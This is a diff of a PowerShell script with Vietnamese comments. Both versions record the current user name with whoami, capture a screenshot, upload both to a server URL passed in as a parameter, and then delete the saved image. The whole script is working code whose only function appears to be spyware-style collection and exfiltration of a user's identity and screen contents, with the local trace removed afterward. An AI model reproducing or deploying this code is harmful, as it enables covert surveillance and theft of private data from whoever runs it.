@@ -1,48 +1,32 @@
-# Hàm chụp ảnh màn hình và gửi thông tin
-function info {
-    param(
-        [Parameter(Mandatory = $true)]
-        [String]$hq # URL đích để gửi thông tin
-    )
+param(
+    [string]$ServerUrl
+)
 
-    # Thu thập tên người dùng hiện tại
-    $name = whoami
+# Lấy tên máy
+$name = whoami
 
-    # Chụp ảnh màn hình
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
+# Đường dẫn tạm để lưu ảnh chụp màn hình
+$tempScreenshot = "$env:TEMP\screenshot.png"
 
-    $screenWidth = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
-    $screenHeight = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height
-    $bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+# Chụp ảnh màn hình
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
 
-    # Lưu ảnh vào file tạm thời
-    $screenshotPath = "$env:TEMP\screenshot_$([System.Guid]::NewGuid()).png"
-    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+$bitmap.Save($tempScreenshot, [System.Drawing.Imaging.ImageFormat]::Png)
 
-    $graphics.Dispose()
-    $bitmap.Dispose()
-    
- # Chuẩn bị nội dung để gửi
-    $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
-    $encodedScreenshot = [Convert]::ToBase64String($fileContent)
-    $body = @{
-        name = $name
-        screenshot = $encodedScreenshot
-    }
+# Gửi dữ liệu về server
+$webClient = New-Object System.Net.WebClient
 
-    # Gửi thông tin qua POST request
-    try {
-        Invoke-WebRequest -Uri $hq -Method POST -Body $body -ContentType "application/json"
-        Write-Host "Thông tin đã được gửi thành công."
-    } catch {
-        Write-Host "Lỗi khi gửi thông tin: $_"
-    }
+# Gửi tên máy
+$webClient.UploadString("$ServerUrl/name", $name)
 
-    # Xóa file tạm
-    Remove-Item -Path $screenshotPath -Force
-   
-}
+# Gửi ảnh chụp màn hình
+$fileBytes = [System.IO.File]::ReadAllBytes($tempScreenshot)
+$webClient.UploadData("$ServerUrl/screenshot", $fileBytes)
 
+# Xoá ảnh chụp màn hình sau khi gửi
+Remove-Item $tempScreenshot
